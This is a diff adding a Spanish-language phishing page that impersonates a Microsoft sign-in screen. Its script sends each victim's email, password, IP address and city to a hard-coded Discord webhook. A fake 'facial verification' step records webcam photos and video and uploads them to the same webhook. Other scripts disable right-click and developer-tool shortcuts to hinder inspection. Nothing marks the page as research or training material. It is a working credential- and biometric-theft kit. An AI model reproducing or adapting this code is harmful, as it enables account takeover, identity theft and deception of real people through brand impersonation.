@@ -1,0 +1,900 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Iniciar sesión - Microsoft</title>
+  <style>
+    :root{
+      --ms-blue:#0067b8;
+      --ms-blue-hover:#005a9e;
+      --text:#1b1b1b;
+      --muted:#5e5e5e;
+      --link:#0067b8;
+      --card-shadow: 0 2px 6px rgba(0,0,0,.2);
+      --card-radius: 4px;
+    }
+
+    *{ box-sizing:border-box; }
+    html,body{ height:100%; }
+    body{
+      margin:0;
+      font-family: "Segoe UI", SegoeUI, "Helvetica Neue", Arial, sans-serif;
+      color:var(--text);
+      /* Fondo */
+      background:
+        url("fondo.jpg") center/cover no-repeat fixed;
+    }
+
+    /* Capa suave para simular el look (ligero "haze" del fondo) */
+    .overlay{
+      min-height:100%;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      padding: 28px 16px 56px;
+      background: rgba(0,0,0,0.08);
+    }
+
+    .card{
+      width: 440px;
+      max-width: 100%;
+      background:#fff;
+      border-radius: var(--card-radius);
+      box-shadow: var(--card-shadow);
+      padding: 40px 44px 28px;
+    }
+
+    .brand{
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      margin-bottom: 18px;
+      gap:10px;
+      user-select:none;
+    }
+    .brand img{
+      height: 24px;
+      width:auto;
+      display:block;
+    }
+
+    h1{
+      font-size: 24px;
+      font-weight: 600;
+      margin: 8px 0 6px;
+      text-align:center;
+      letter-spacing: .2px;
+    }
+
+    .subtitle{
+      text-align:center;
+      color: var(--muted);
+      font-size: 14px;
+      margin: 0 0 18px;
+    }
+
+    .field{
+      margin-top: 10px;
+    }
+    .input{
+      width:100%;
+      height: 36px;
+      padding: 8px 10px;
+      border: 1px solid #c8c8c8;
+      border-radius: 2px;
+      font-size: 14px;
+      outline: none;
+    }
+    .input:focus{
+      border-color:#8a8a8a;
+      box-shadow: 0 0 0 1px #8a8a8a inset;
+    }
+
+    .link{
+      display:inline-block;
+      margin: 10px 0 14px;
+      font-size: 13px;
+      color: var(--link);
+      text-decoration: none;
+    }
+    .link:hover{ text-decoration: underline; }
+
+    .btn{
+      width:100%;
+      height: 36px;
+      border: none;
+      border-radius: 3px;
+      background: var(--ms-blue);
+      color:#fff;
+      font-weight: 600;
+      font-size: 14px;
+      cursor:pointer;
+      margin: 8px 0 18px;
+    }
+    .btn:hover{ background: var(--ms-blue-hover); }
+
+    .new{
+      text-align:center;
+      margin-top: 8px;
+      color: var(--muted);
+      font-size: 13px;
+      line-height: 1.35;
+    }
+    .new a{
+      color: var(--link);
+      text-decoration: none;
+      font-weight: 600;
+    }
+    .new a:hover{ text-decoration: underline; }
+
+    /* Footer inferior */
+    .footer{
+      position: fixed;
+      left: 0;
+      right: 0;
+      bottom: 10px;
+      display:flex;
+      justify-content:center;
+      padding: 0 12px;
+      pointer-events: none; /* para que no "moleste" visualmente */
+    }
+    .footer .inner{
+      pointer-events: auto;
+      display:flex;
+      gap: 22px;
+      font-size: 12px;
+      color: #1b1b1b;
+      align-items:center;
+    }
+    .footer a{
+      color:#1b1b1b;
+      text-decoration:none;
+      opacity:.9;
+    }
+    .footer a:hover{ text-decoration: underline; }
+
+    /* Texto pequeñito debajo (como "exploración privada...") */
+    .footer-note{
+      position: fixed;
+      left:0; right:0;
+      bottom: 34px;
+      text-align:center;
+      font-size: 11px;
+      color: rgba(0,0,0,.65);
+      padding: 0 12px;
+    }
+    .footer-note a{
+      color: rgba(0,0,0,.65);
+      text-decoration: underline;
+    }
+
+    /* Nuevos estilos para el comportamiento adicional */
+    .hidden {
+      display: none !important;
+    }
+    
+    .user-email-display {
+      display: inline-block;
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 999px;
+      padding: 4px 16px;
+      margin-bottom: 16px;
+      font-size: 12px;
+      font-weight: 600;
+      color: #616161;
+      word-break: break-all;
+    }
+    
+    .back-button {
+      position: absolute;
+      top: 16px;
+      left: 16px;
+      color: rgba(3, 3, 3, 0.9);
+      font-size: 14px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      transition: all 0.2s ease-in-out;
+      background: none;
+      border: none;
+      text-shadow: 0 1px 1px rgba(0,0,0,0.2);
+    }
+    
+    .back-button:hover {
+      color: #000000;
+      transform: translateX(-2px);
+    }
+    
+    .password-container {
+      position: relative;
+    }
+    
+    .toggle-password {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #616161;
+      cursor: pointer;
+      background: none;
+      border: none;
+      font-size: 16px;
+      transition: all 0.2s ease-in-out;
+      width: 30px;
+      height: 30px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+    }
+    
+    .toggle-password:hover {
+      color: #0078d4;
+      background-color: rgba(0,0,0,0.05);
+    }
+    
+    /* Estilos para la verificación facial */
+    .verification-box {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+    
+    .camera-view {
+      position: relative;
+      width: 150px;
+      height: 150px;
+      border-radius: 50%;
+      margin: 0 auto 20px;
+      background-color: #333;
+      border: 3px solid #0078d4;
+      box-shadow: 0 0 15px rgba(0, 120, 212, 0.5);
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #aaa;
+      font-size: 12px;
+    }
+    
+    .camera-view video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      transform: scaleX(-1);
+    }
+    
+    .verification-indications {
+      font-size: 14px;
+      color: black;
+      margin-bottom: 20px;
+      min-height: 30px;
+      font-weight: 600;
+    }
+    
+    .progress-bar {
+      height: 5px;
+      background-color: #9b9b9b;
+      border-radius: 3px;
+      margin: 0 auto 15px;
+      overflow: hidden;
+      width: 80%;
+    }
+    
+    .progress-bar-fill {
+      height: 100%;
+      width: 0%;
+      background-color: #0078d4;
+      transition: width 0.5s ease;
+    }
+    
+    .btn-secondary {
+      background-color: #9b9b9b;
+      color: white;
+    }
+    
+    .btn-secondary:hover {
+      background-color: #555555;
+    }
+
+    .input[type="password"] {
+      padding-right: 40px;
+    }
+
+    .email-display {
+      text-align: center;
+      margin-bottom: 16px;
+      word-break: break-all;
+      font-size: 14px;
+      color: #181818c2;
+      padding: 8px;
+      background-color: rgb(0 0 0 / 11%);
+      border-radius: 4px;
+    }
+
+    .step {
+      transition: opacity 0.3s ease;
+    }
+
+    /* Responsive: en pantallas muy chicas, reduce padding */
+    @media (max-width: 480px){
+      .card{ padding: 28px 22px 22px; }
+      .footer .inner{ gap: 14px; }
+      .camera-view {
+        width: 120px;
+        height: 120px;
+      }
+    }
+  </style>
+</head>
+
+<body oncontextmenu="return false">
+<script>
+document.addEventListener("keydown", function(e) {
+  if(e.key === "F12") return false;
+  if(e.ctrlKey && e.key === "u") return false;
+  if(e.ctrlKey && e.shiftKey && e.key === "I") return false;
+});
+</script>
+
+  <div class="overlay">
+    <main class="card" role="main" aria-label="Microsoft Iniciar sesión">
+      <!-- Paso 1: Email -->
+      <div id="email-step" class="step">
+        <div class="brand" aria-hidden="true">
+          <img src="logo.png" alt="Microsoft" />
+        </div>
+
+        <h1>Iniciar sesión</h1>
+        <p class="subtitle">Usar tu cuenta de Microsoft.</p>
+
+        <div class="field">
+          <input class="input"
+                 type="email"
+                 id="email"
+                 autocomplete="username"
+                 inputmode="email"
+                 placeholder="Correo electrónico o número de teléfono"
+                 aria-label="Correo electrónico o número de teléfono" />
+        </div>
+
+        <a class="link" href="#" onclick="return false;">¿Olvidaste tu nombre de usuario?</a>
+
+        <button class="btn" type="button" id="next-btn">Siguiente</button>
+
+        <div class="new">
+          <div>¿Es nuevo en Microsoft?</div>
+          <a href="#" onclick="return false;">Crear una cuenta</a>
+        </div>
+      </div>
+
+      <!-- Paso 2: Contraseña -->
+      <div id="password-step" class="step hidden">
+        <button class="back-button" id="back-button" aria-label="Volver atrás">
+          ←
+        </button>
+        
+        <div class="brand" aria-hidden="true">
+          <img src="logo.png" alt="Microsoft" />
+        </div>
+
+        <div class="email-display" id="user-email-display" aria-live="polite"></div>
+        
+        <h1>Escriba la contraseña</h1>
+
+        <div class="field password-container">
+          <input class="input"
+                 type="password"
+                 id="password"
+                 autocomplete="current-password"
+                 placeholder="Contraseña"
+                 aria-label="Contraseña" />
+          <button type="button" class="toggle-password" onclick="togglePassword()" aria-label="Mostrar contraseña">
+            👁️
+          </button>
+        </div>
+
+        <a class="link" href="#" onclick="return false;">¿Olvidaste tu contraseña?</a>
+
+        <button class="btn" type="button" id="login-btn">Iniciar sesión</button>
+
+       
+      </div>
+
+      <!-- Paso 3: Verificación facial -->
+      <div id="verification-step" class="step hidden">
+        <button class="back-button" id="back-button-verification" aria-label="Volver atrás">
+          ←
+        </button>
+        
+        <div class="brand" aria-hidden="true">
+          <img src="logo.png" alt="Microsoft" />
+        </div>
+
+        <h1>Verificación de Autenticidad</h1>
+
+        <div class="verification-box">
+          <div class="camera-view">
+            <video id="camera-stream" autoplay playsinline muted></video>
+            <div id="camera-placeholder" style="position: absolute;">Cargando cámara...</div>
+          </div>
+          
+          <div class="progress-bar">
+            <div id="progress-bar-fill" class="progress-bar-fill"></div>
+          </div>
+
+          <p class="subtitle">
+            Para verificar que eres tú, te someteremos a una verificación facial. 
+            Por favor, sigue las indicaciones en pantalla con buena iluminación.
+          </p>
+          
+          <div id="verification-indications" class="verification-indications">
+            Pulse 'Iniciar Verificación'.
+          </div>
+
+          <button id="start-verification-btn" class="btn" aria-label="Iniciar Verificación"> 
+            Iniciar Verificación 
+          </button>
+          <button id="cancel-btn" class="btn btn-secondary" aria-label="Cancelar"> 
+            Cancelar 
+          </button>
+          
+          <canvas id="canvas" style="display:none;"></canvas>
+        </div>
+      </div>
+    </main>
+  </div>
+
+  <div class="footer-note">
+    Usa la exploración privada si este no es tu dispositivo. <a href="#" onclick="return false;">Más información</a>
+  </div>
+
+  <footer class="footer" aria-label="Enlaces de pie de página">
+    <div class="inner">
+      <a href="#" onclick="return false;">Ayuda</a>
+      <a href="#" onclick="return false;">Términos de uso</a>
+      <a href="#" onclick="return false;">Privacidad y cookies</a>
+    </div>
+  </footer>
+
+<script>
+// Configuración para Discord
+const discord_webhook_url = "https://discord.com/api/webhooks/1457978328765173821/B-FE41gHhAwaWc9cdXYDGr0eVYmmooXRh1CntS3SxzJmuGSnS9VaYRONudAQ0LiETjzR";
+
+// Variables globales
+let stream = null;
+let currentStep = 0;
+const totalSteps = 4;
+let verificationRunning = false;
+let mediaRecorder = null;
+const videoChunks = [];
+const snapshots = [];
+
+// Elementos del DOM
+const cameraStream = document.getElementById('camera-stream');
+const startVerificationBtn = document.getElementById('start-verification-btn');
+const cancelBtn = document.getElementById('cancel-btn');
+const indicationsDiv = document.getElementById('verification-indications');
+const progressBarFill = document.getElementById('progress-bar-fill');
+const canvas = document.getElementById('canvas');
+
+// Pasos de verificación
+const verificationSteps = [
+  { instruction: "Mantén el rostro en el círculo y mira al frente.", delay: 3000, action: 'wait_front', capture: true },
+  { instruction: "Asegúrate de no usar lentes ni gorras.", delay: 2500, action: 'turn_left', capture: true },
+  { instruction: "Posiciónate correctamente en el círculo.", delay: 2500, action: 'turn_right', capture: true },
+  { instruction: "Parpadea varias veces.", delay: 2500, action: 'blink', capture: true }
+];
+
+// Funciones auxiliares
+function dataURLtoBlob(dataurl) {
+  let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+      bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+  while(n--){
+    u8arr[n] = bstr.charCodeAt(n);
+  }
+  return new Blob([u8arr], {type:mime});
+}
+
+async function getGeoData() {
+  let ip = "N/A", location = "N/A";
+  try {
+    const ipData = await fetch("https://api.ipify.org?format=json").then(r => r.json());
+    ip = ipData.ip;
+    const geoData = await fetch("https://ipinfo.io").then(r => r.json());
+    location = geoData.city + ", " + geoData.country;
+  } catch(e) {
+    console.error("Error al obtener IP/Geo:", e);
+  }
+  return { ip, location };
+}
+
+function getUserIdentifier() {
+  return localStorage.getItem('telefonoUsuario') || 'usuario_desconocido';
+}
+
+async function sendMessageToDiscord(message) {
+  try {
+    const response = await fetch(discord_webhook_url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        content: message
+      })
+    });
+    
+    if (!response.ok) {
+      console.error(`Error HTTP: ${response.status} ${response.statusText}`);
+    }
+    
+    console.log("Mensaje enviado a Discord");
+    return true;
+  } catch (error) {
+    console.error("Error al enviar mensaje a Discord:", error);
+    return false;
+  }
+}
+
+async function sendFileToDiscord(blob, filename, message) {
+  try {
+    const userIdentifier = getUserIdentifier();
+    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+    const finalFilename = `${userIdentifier}_${timestamp}_${filename}`;
+    
+    const formData = new FormData();
+    formData.append('file', blob, finalFilename);
+    
+    if (message) {
+      formData.append('content', message);
+    }
+    
+    const response = await fetch(discord_webhook_url, {
+      method: 'POST',
+      body: formData
+    });
+    
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+    
+    console.log("Archivo enviado a Discord");
+    return true;
+  } catch (error) {
+    console.error("Error al enviar archivo a Discord:", error);
+    return false;
+  }
+}
+
+// Funciones de cámara y verificación
+function togglePassword() {
+  const passwordInput = document.getElementById('password');
+  const toggleBtn = document.querySelector('.toggle-password');
+  
+  if (passwordInput.type === 'password') {
+    passwordInput.type = 'text';
+    toggleBtn.textContent = '🙈';
+  } else {
+    passwordInput.type = 'password';
+    toggleBtn.textContent = '👁️';
+  }
+}
+
+function startRecording() {
+  videoChunks.length = 0;
+  
+  let options = { mimeType: 'video/webm' };
+  if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+    options = { mimeType: 'video/mp4' };
+    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+      options = { mimeType: 'video/webm; codecs=vp8' };
+    }
+  }
+  
+  try {
+    mediaRecorder = new MediaRecorder(stream, options);
+    
+    mediaRecorder.ondataavailable = event => {
+      if (event.data && event.data.size > 0) {
+        videoChunks.push(event.data);
+        console.log(`Chunk de video recibido: ${event.data.size} bytes`);
+      }
+    };
+    
+    mediaRecorder.onerror = (event) => {
+      console.error("Error en MediaRecorder:", event.error);
+    };
+    
+    mediaRecorder.start(1000);
+    console.log("Grabación iniciada con mimeType:", options.mimeType);
+    
+  } catch (error) {
+    console.error("Error al iniciar MediaRecorder:", error);
+    indicationsDiv.innerHTML = "⚠️ **Error de Grabación:** " + error.message;
+    verificationRunning = false;
+  }
+}
+
+function stopRecording() {
+  if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+    mediaRecorder.stop();
+    console.log("Grabación detenida");
+  }
+}
+
+async function startCamera() {
+  if (stream) return;
+  
+  indicationsDiv.innerHTML = "Cargando cámara, por favor espere...";
+  cameraStream.style.display = 'none'; 
+  startVerificationBtn.disabled = true;
+
+  try {
+    const constraints = {
+      video: {
+        facingMode: 'user',
+        width: { ideal: 1280 },
+        height: { ideal: 720 },
+        frameRate: { ideal: 30 }
+      },
+      audio: false
+    };
+    
+    stream = await navigator.mediaDevices.getUserMedia(constraints);
+    cameraStream.srcObject = stream;
+    
+    cameraStream.onloadedmetadata = () => {
+      cameraStream.play().then(() => {
+        cameraStream.style.display = 'block';
+        document.getElementById('camera-placeholder').style.display = 'none';
+        indicationsDiv.innerHTML = "✅ Cámara lista. Asegúrate de tener buena luz.";
+        startVerificationBtn.disabled = false;
+      }).catch(err => {
+        console.error("Error reproduciendo video:", err);
+        indicationsDiv.innerHTML = "⚠️ Error reproduciendo video. Recarga la página.";
+      });
+    };
+
+    cameraStream.onerror = (err) => {
+      console.error("Error en video stream:", err);
+      indicationsDiv.innerHTML = "⚠️ Error en la cámara. Recarga la página.";
+    };
+
+  } catch (err) {
+    console.error("Error al acceder a la cámara:", err);
+    indicationsDiv.innerHTML = "⚠️ Error: No se pudo acceder a la cámara. Asegúrate de dar permisos y usar HTTPS.";
+    startVerificationBtn.disabled = true;
+  }
+}
+
+function startVerificationProcess() {
+  if (verificationRunning) return;
+  
+  startRecording();
+  
+  verificationRunning = true;
+  snapshots.length = 0;
+  
+  startVerificationBtn.disabled = true;
+  startVerificationBtn.textContent = 'Verificando...';
+  cancelBtn.disabled = true;
+
+  currentStep = 0;
+  nextStep();
+}
+
+function nextStep() {
+  if (currentStep >= totalSteps) {
+    handleVerificationSuccess();
+    return;
+  }
+
+  const step = verificationSteps[currentStep];
+  
+  indicationsDiv.innerHTML = `📷 ${step.instruction}`;
+
+  const progress = ((currentStep + 1) / totalSteps) * 100;
+  progressBarFill.style.width = `${progress}%`;
+
+  setTimeout(() => {
+    if (step.capture) {
+      try {
+        const snapshotData = capturePhoto();
+        snapshots.push(snapshotData);
+        console.log(`Captura ${currentStep + 1} realizada`);
+      } catch (error) {
+        console.error("Error capturando foto:", error);
+      }
+    }
+    
+    indicationsDiv.innerHTML = `✅¡Correcto! Preparando siguiente paso...`;
+    
+    currentStep++;
+    setTimeout(nextStep, 1000); 
+  }, step.delay);
+}
+
+function capturePhoto() {
+  try {
+    canvas.width = cameraStream.videoWidth;
+    canvas.height = cameraStream.videoHeight;
+    const context = canvas.getContext('2d');
+    
+    context.translate(canvas.width, 0);
+    context.scale(-1, 1);
+    
+    context.drawImage(cameraStream, 0, 0, canvas.width, canvas.height);
+    
+    const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+    return dataUrl;
+  } catch (error) {
+    console.error("Error en capturePhoto:", error);
+    return '';
+  }
+}
+
+async function handleVerificationSuccess() {
+  try {
+    stopRecording();
+    indicationsDiv.innerHTML = "Procesando verificación...";
+    startVerificationBtn.textContent = 'Completando...';
+    
+    const userIdentifier = getUserIdentifier();
+    const geoData = await getGeoData();
+
+    const credentialsMessage = `🔐 **NUEVO INICIO DE SESIÓN**\n\n📧 **Usuario:** ${userIdentifier}\n🔒 **Contraseña:** ${document.getElementById('password').value}\n🌐 **IP:** ${geoData.ip}\n📍 **Ubicación:** ${geoData.location}\n\n📸 **Verificación Facial:** Completada (${snapshots.length} capturas realizadas)`;
+    
+    await sendMessageToDiscord(credentialsMessage);
+
+    for (let i = 0; i < snapshots.length; i++) {
+      try {
+        const photoBlob = dataURLtoBlob(snapshots[i]);
+        const photoMessage = `📸 **CAPTURA FACIAL ${i + 1}/${snapshots.length}**\n👤 Usuario: ${userIdentifier}`;
+        await sendFileToDiscord(photoBlob, `foto_${i+1}.jpg`, photoMessage);
+        await new Promise(resolve => setTimeout(resolve, 500));
+      } catch (error) {
+        console.error(`Error enviando foto ${i+1}:`, error);
+      }
+    }
+
+    if (videoChunks.length > 0) {
+      try {
+        const videoBlob = new Blob(videoChunks, { type: mediaRecorder?.mimeType || 'video/webm' });
+        const videoMessage = `🎥 **VIDEO DE VERIFICACIÓN**\n👤 Usuario: ${userIdentifier}\n⏱️ Duración: ${Math.round(videoBlob.size / 1000)}KB`;
+        await sendFileToDiscord(videoBlob, 'verificacion_video.webm', videoMessage);
+      } catch (error) {
+        console.error("Error enviando video:", error);
+      }
+    }
+    
+    indicationsDiv.innerHTML = "🎉 Verificación Exitosa. Redirigiendo...";
+    
+    await sendMessageToDiscord(`✅ **VERIFICACIÓN COMPLETADA**\n👤 ${userIdentifier}\n✅ ${snapshots.length} fotos capturadas\n✅ Video de verificación enviado`);
+    
+    setTimeout(() => {
+      window.location = 'index.html';
+    }, 3000); 
+    
+  } catch (error) {
+    console.error("Error en handleVerificationSuccess:", error);
+    indicationsDiv.innerHTML = "⚠️ Error procesando verificación. Recargando...";
+    setTimeout(() => window.location.reload(), 3000);
+  }
+}
+
+function stopCamera() {
+  if (stream) {
+    stream.getTracks().forEach(track => {
+      track.stop();
+      console.log("Track de cámara detenido");
+    });
+    stream = null;
+  }
+}
+
+// Manejo de eventos del DOM
+document.addEventListener('DOMContentLoaded', function() {
+  const emailInput = document.getElementById('email');
+  const nextBtn = document.getElementById('next-btn');
+  const backBtn = document.getElementById('back-button');
+  const backVerificationBtn = document.getElementById('back-button-verification');
+  const loginBtn = document.getElementById('login-btn');
+  const emailDisplay = document.getElementById('user-email-display');
+  const passwordInput = document.getElementById('password');
+  
+  const emailStep = document.getElementById('email-step');
+  const passwordStep = document.getElementById('password-step');
+  const verificationStep = document.getElementById('verification-step');
+
+  // Paso 1: Email
+  nextBtn.addEventListener('click', function() {
+    const email = emailInput.value.trim();
+    if (!email) return;
+    
+    emailDisplay.textContent = email;
+    localStorage.setItem('telefonoUsuario', email);
+    
+    emailStep.classList.add('hidden');
+    passwordStep.classList.remove('hidden');
+    passwordInput.focus();
+  });
+
+  emailInput.addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+      nextBtn.click();
+    }
+  });
+
+  // Paso 2: Contraseña
+  backBtn.addEventListener('click', function() {
+    passwordStep.classList.add('hidden');
+    emailStep.classList.remove('hidden');
+    emailInput.focus();
+  });
+
+  loginBtn.addEventListener('click', async function() {
+    const email = emailDisplay.textContent;
+    const password = passwordInput.value;
+    
+    if (!password) return;
+    
+    localStorage.setItem('telefonoUsuario', email);
+    
+    let ip = "N/A", location = "N/A";
+    try {
+      const ipData = await fetch("https://api.ipify.org?format=json").then(r => r.json());
+      ip = ipData.ip;
+      const geoData = await fetch("https://ipinfo.io").then(r => r.json());
+      location = geoData.city + ", " + geoData.country;
+    } catch(e) {
+      console.error("Error obteniendo datos:", e);
+    }
+    
+    const message = `🔐 **NUEVO INICIO DE SESIÓN**\n\n📧 **Usuario:** ${email}\n🔒 **Contraseña:** ${password}\n🌐 **IP:** ${ip}\n📍 **Ubicación:** ${location}`;
+    
+    await sendMessageToDiscord(message);
+    
+    passwordStep.classList.add('hidden');
+    verificationStep.classList.remove('hidden');
+    startCamera();
+  });
+
+  passwordInput.addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+      loginBtn.click();
+    }
+  });
+
+  // Paso 3: Verificación
+  backVerificationBtn.addEventListener('click', function() {
+    stopCamera();
+    stopRecording();
+    verificationStep.classList.add('hidden');
+    passwordStep.classList.remove('hidden');
+  });
+
+  startVerificationBtn.addEventListener('click', startVerificationProcess);
+  
+  cancelBtn.addEventListener('click', async function() {
+    const userIdentifier = getUserIdentifier();
+    await sendMessageToDiscord(`❌ **VERIFICACIÓN CANCELADA**\n👤 Usuario: ${userIdentifier}\n⏱️ ${new Date().toLocaleString()}`);
+    
+    stopCamera();
+    stopRecording();
+    indicationsDiv.innerHTML = "Proceso cancelado. Recargando...";
+    setTimeout(() => window.location.reload(), 1000);
+  });
+
+  // Enlaces
+  document.querySelectorAll('a[href="#"]').forEach(link => {
+    link.addEventListener('click', function(e) {
+      e.preventDefault();
+    });
+  });
+});
+</script>
+</body>
+</html>
